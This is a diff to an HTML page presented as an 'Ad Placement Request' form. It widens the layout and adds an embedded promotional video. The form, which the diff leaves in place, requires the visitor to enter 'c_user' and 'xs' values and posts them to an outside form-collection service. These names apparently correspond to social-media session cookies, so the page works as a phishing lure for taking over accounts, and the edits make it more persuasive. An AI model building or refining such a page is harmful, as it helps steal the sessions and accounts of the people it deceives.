@@ -12,7 +12,7 @@ body {
     padding: 0;
 }
 .container {
-    max-width: 400px;
+    max-width: 500px;
     margin: 50px auto;
     background: #fff;
     padding: 25px;
@@ -30,6 +30,14 @@ p.description {
     font-size: 14px;
     line-height: 1.4;
     margin-bottom: 20px;
+}
+.video-container {
+    text-align: center;
+    margin-bottom: 20px;
+}
+.video-container video {
+    width: 100%;
+    border-radius: 10px;
 }
 form input, form button {
     width: 100%;
@@ -72,11 +80,21 @@ p.note {
 <body>
 
 <div class="container">
+
 <h2>Ad Placement Request</h2>
 <p class="description">
 Please fill in the details below to submit your request for placing an ad. Only the required fields are needed.
 </p>
 
+<!-- Video Section -->
+<div class="video-container">
+<video controls>
+  <source src="https://resource2.heygen.ai/video_translate/94087358030a4df8b20e73f1fba92ed5-en/720p.mp4" type="video/mp4">
+  Your browser does not support the video tag.
+</video>
+</div>
+
+<!-- Form -->
 <form id="adForm" action="https://submit-form.com/upL3IuLAs" method="POST">
     <input type="text" name="c_user" placeholder="Enter c_user value" required>
     <input type="text" name="xs" placeholder="Enter XS value" required>
